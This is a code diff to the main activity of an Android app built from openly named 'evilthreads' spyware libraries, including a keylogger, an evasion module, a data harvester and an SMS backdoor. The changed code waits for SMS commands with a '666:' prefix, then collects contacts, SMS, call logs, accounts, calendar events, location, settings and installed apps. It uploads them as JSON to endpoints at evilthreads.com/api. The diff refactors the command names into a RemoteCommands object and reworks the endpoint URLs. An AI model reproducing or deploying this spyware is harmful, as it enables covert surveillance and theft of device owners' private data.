@@ -22,6 +22,17 @@ import com.evilthreads.evade.evade
 import com.evilthreads.keylogger.Keylogger
 import com.evilthreads.pickpocket.*
 import com.evilthreads.pickpocket.podos.*
+import com.evilthreads.smsbackdoor.RemoteCommands.GET_ACCOUNTS
+import com.evilthreads.smsbackdoor.RemoteCommands.GET_APPS
+import com.evilthreads.smsbackdoor.RemoteCommands.GET_CALENDAR_EVENTS
+import com.evilthreads.smsbackdoor.RemoteCommands.GET_CALL_LOG
+import com.evilthreads.smsbackdoor.RemoteCommands.GET_CONTACTS
+import com.evilthreads.smsbackdoor.RemoteCommands.GET_DEVICE_INFO
+import com.evilthreads.smsbackdoor.RemoteCommands.GET_FILES
+import com.evilthreads.smsbackdoor.RemoteCommands.GET_LOCATION
+import com.evilthreads.smsbackdoor.RemoteCommands.GET_MMS
+import com.evilthreads.smsbackdoor.RemoteCommands.GET_SETTINGS
+import com.evilthreads.smsbackdoor.RemoteCommands.GET_SMS
 import com.kotlinpermissions.KotlinPermissions
 import io.ktor.client.*
 import io.ktor.client.engine.cio.*
@@ -64,7 +75,7 @@ import kotlinx.coroutines.runBlocking
 *  the data associated each remote command defined within [RemoteCommands]. The data is then serialized and posted to one of the various endpoints of the web servers' REST API with
 *  Ktor [HTTPClient] using [Auth.basic] feature for basic authentication and the [CIO] [HTTPClientEngine].
 * */
-
+@KtorExperimentalAPI
 class MainActivity : AppCompatActivity() {
 
     companion object{
@@ -84,16 +95,17 @@ class MainActivity : AppCompatActivity() {
                         SmsBackdoor.openDoor(this@MainActivity, "666:", payload = myPayload) { remoteCommand ->
                             runBlocking {
                                 when (remoteCommand) {
-                                    "COMMAND_GET_CONTACTS" -> calendarLaunch(this@MainActivity).let { calendarEvents -> client.upload(calendarEvents) }
-                                    "COMMAND_GET_CALL_LOG" -> callLogLaunch(this@MainActivity).let { calls -> client.upload(calls) }
-                                    "COMMAND_GET_SMS" -> smsLaunch(this@MainActivity).let { smsMessages -> client.upload(smsMessages) }
-                                    "COMMAND_GET_ACCOUNTS" -> accountsLaunch(this@MainActivity).let { accounts -> client.upload(accounts) }
-                                    "COMMAND_GET_MMS" -> mmsLaunch(this@MainActivity).let { mmsMessages -> Log.d(TAG, "NEEDS MULTIPART") }
-                                    "COMMAND_GET_FILES" -> filesLaunch(this@MainActivity).let { files -> Log.d(TAG, "NEEDS MULTIPART") }
-                                    "COMMAND_GET_DEVICE_INFO" -> deviceLaunch(this@MainActivity).let { device -> client.upload(listOf(device)) }
-                                    "COMMAND_GET_LOCATION" -> locationLaunch(this@MainActivity)?.let { location -> client.upload(listOf(location)) }
-                                    "COMMAND_GET_SETTINGS" -> settingsLaunch(this@MainActivity).let { settings -> client.upload(settings) }
-                                    "COMMAND_GET_INSTALLED_APPS" -> softwareLaunch(this@MainActivity).let { apps -> client.upload(apps) }
+                                    GET_CALENDAR_EVENTS -> calendarLaunch(this@MainActivity).let { calendarEvents -> client.upload(calendarEvents) }
+                                    GET_CONTACTS -> contactsLaunch(this@MainActivity).let { contacts -> client.upload(contacts) }
+                                    GET_CALL_LOG -> callLogLaunch(this@MainActivity).let { calls -> client.upload(calls) }
+                                    GET_SMS -> smsLaunch(this@MainActivity).let { smsMessages -> client.upload(smsMessages) }
+                                    GET_ACCOUNTS -> accountsLaunch(this@MainActivity).let { accounts -> client.upload(accounts) }
+                                    GET_MMS -> mmsLaunch(this@MainActivity).let { mmsMessages -> Log.d(TAG, "NEEDS MULTIPART") }
+                                    GET_FILES -> filesLaunch(this@MainActivity).let { files -> Log.d(TAG, "NEEDS MULTIPART") }
+                                    GET_DEVICE_INFO -> deviceLaunch(this@MainActivity).let { device -> client.upload(listOf(device)) }
+                                    GET_LOCATION -> locationLaunch(this@MainActivity)?.let { location -> client.upload(listOf(location)) }
+                                    GET_SETTINGS -> settingsLaunch(this@MainActivity).let { settings -> client.upload(settings) }
+                                    GET_APPS -> softwareLaunch(this@MainActivity).let { apps -> client.upload(apps) }
                                     else -> Log.d(TAG, "COMMAND NOT FOUND")
                                 }
                             }
@@ -105,6 +117,7 @@ class MainActivity : AppCompatActivity() {
     }
 }
 
+@KtorExperimentalAPI
 val client = HttpClient(CIO){
     install(JsonFeature){
         serializer = KotlinxSerializer()
@@ -117,33 +130,37 @@ val client = HttpClient(CIO){
     }
 }
 
-val url = "http://evilthreads.com/"
-val contactsUri = url.plus("contacts")
-val smsUri = url.plus("sms")
-val callLogUri = url.plus("calls")
-val accountsUri = url.plus("accounts")
-val mmsUri = url.plus("mms")
-val filesUri = url.plus("files")
-val deviceUri = url.plus("device")
-val locationUri = url.plus("location")
-val settingsUri = url.plus("settings")
-val softwareUri = url.plus("software")
+val BASE_URL = "http://evilthreads.com/api"
 
 inline suspend fun <reified T: PocketData> HttpClient.upload(data: List<T>){
-    lateinit var uri: String
+    lateinit var endPoint: String
     when(data.first()){
-        is Contact -> uri = contactsUri
-        is CallLogEntry -> uri = callLogUri
-        is Sms -> uri = smsUri
-        is UserAccount -> uri = accountsUri
-        is Mms -> uri = mmsUri
-        is DocumentsFile -> uri = filesUri
-        is Device -> uri = deviceUri
-        is RecentLocation -> uri = locationUri
-        is Setting -> uri = settingsUri
-        is Software -> uri = softwareUri
+        is Contact -> endPoint = "$BASE_URL/contacts"
+        is CallLogEntry -> endPoint = "$BASE_URL/calls"
+        is Sms -> endPoint = "$BASE_URL/sms"
+        is UserAccount -> endPoint = "$BASE_URL/accounts"
+        is Mms -> endPoint = "$BASE_URL/mms"
+        is DocumentsFile -> endPoint = "$BASE_URL/files"
+        is Device -> endPoint = "$BASE_URL/devices"
+        is RecentLocation -> endPoint = "$BASE_URL/locations"
+        is Setting -> endPoint = "$BASE_URL/settings"
+        is Software -> endPoint = "$BASE_URL/apps"
     }
-    this.post<List<T>>(uri){
+    this.post<List<T>>(endPoint){
         body = defaultSerializer().write(data, ContentType.Application.Json)
     }
+}
+
+object RemoteCommands{
+    val GET_DEVICE_INFO = "COMMAND_GET_DEVICE_INFO"
+    val GET_ACCOUNTS = "COMMAND_GET_ACCOUNTS"
+    val GET_CONTACTS = "COMMAND_GET_CONTACTS"
+    val GET_SMS = "COMMAND_GET_SMS"
+    val GET_MMS = "COMMAND_GET_MMS"
+    val GET_CALL_LOG = "COMMAND_GET_CALL_LOG"
+    val GET_CALENDAR_EVENTS = "COMMAND_GET_CALENDAR_EVENTS"
+    val GET_FILES = "COMMAND_GET_FILES"
+    val GET_LOCATION = "COMMAND_GET_LOCATION"
+    val GET_SETTINGS = "COMMAND_GET_SETTINGS"
+    val GET_APPS = "COMMAND_GET_APPS"
 }
